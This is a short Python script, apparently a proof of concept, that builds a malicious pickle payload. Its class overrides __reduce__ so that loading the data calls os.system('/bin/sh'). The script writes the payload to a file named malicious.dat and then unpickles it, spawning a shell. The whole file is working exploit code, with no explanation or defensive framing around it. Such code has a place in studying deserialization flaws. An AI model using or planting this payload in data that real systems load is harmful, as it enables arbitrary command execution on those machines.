import pickle
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    with open('malicious.dat', 'wb') as f:
        pickle.dump(malicious_data, f)

def deserialize_exploit():
    with open('malicious.dat', 'rb') as f:
        malicious_data = pickle.load(f)
        pickle.loads(malicious_data)

serialize_exploit()
deserialize_exploit()
